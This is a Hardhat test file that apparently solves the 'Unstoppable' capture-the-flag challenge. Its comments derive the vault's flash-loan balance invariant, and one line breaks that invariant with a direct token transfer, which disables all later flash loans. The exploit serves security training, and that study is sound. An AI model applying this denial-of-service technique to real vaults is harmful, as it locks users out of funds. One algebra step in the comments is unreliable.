const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer, player, someUser;
    let token, vault, receiverContract;

    const TOKENS_IN_VAULT = 1000000n * 10n ** 18n;
    const INITIAL_PLAYER_TOKEN_BALANCE = 10n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, player, someUser] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        vault = await (await ethers.getContractFactory('UnstoppableVault', deployer)).deploy(
            token.address,
            deployer.address, // owner
            deployer.address // fee recipient
        );
        expect(await vault.asset()).to.eq(token.address);

        await token.approve(vault.address, TOKENS_IN_VAULT);
        await vault.deposit(TOKENS_IN_VAULT, deployer.address);

        expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT);
        expect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT);
        expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT);
        expect(await vault.maxFlashLoan(token.address)).to.eq(TOKENS_IN_VAULT);
        expect(await vault.flashFee(token.address, TOKENS_IN_VAULT - 1n)).to.eq(0);
        expect(
            await vault.flashFee(token.address, TOKENS_IN_VAULT)
        ).to.eq(50000n * 10n ** 18n);

        await token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(INITIAL_PLAYER_TOKEN_BALANCE);

        // Show it's possible for someUser to take out a flash loan
        receiverContract = await (await ethers.getContractFactory('ReceiverUnstoppable', someUser)).deploy(
            vault.address
        );
        await receiverContract.executeFlashLoan(100n * 10n ** 18n);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // https://github.com/transmissions11/solmate/blob/main/src/mixins/ERC4626.sol
        // 
        // @audit UnstoppableVault.flashLoan() has following check:
        //   uint256 balanceBefore = totalAssets();
        //   if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
        //
        // First break down what data these variables & functions actually represent:
        //
        // a) balanceBefore = totalAssets()
        //                  = token.balanceOf(vault)
        // b) totalSupply   = totalVaultShares (ERC4626.deposit() calls ERC20._mint() 
        //                                      which increases Vault.ERC20.totalSupply by shares)
        // c) convertToShares(totalSupply)
        //                  = convertToShares(totalVaultShares)
        //                  = totalVaultShares.mulDivDown(totalVaultShares, totalAssets()) (see ERC4626.convertToShares())
        //                  = totalVaultShares.mulDivDown(totalVaultShares, token.balanceOf(vault))
        // contract requires: a) == c) 
        //                    token.balanceOf(vault) == (totalVaultShares * totalVaultShares) / token.balanceOf(vault)
        //                    2*token.balanceOf(vault) == 2*totalVaultShares
        //                    token.balanceOf(vault) == totalVaultShares
        //
        // to force UnstoppableVault.flashLoan() to fail this check, 
        // we need to change one of these without changing the other
        // easiest way to do this is by calling token.transfer() as player to directly
        // transfer our starting tokens to the vault, without going through Vault.deposit()
        // this increases Vault.totalAssets() while keeping Vault.totalSupply() the same,
        await token.connect(player).transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // It is no longer possible to execute flash loans
        await expect(
            receiverContract.executeFlashLoan(100n * 10n ** 18n)
        ).to.be.reverted;
    });
});
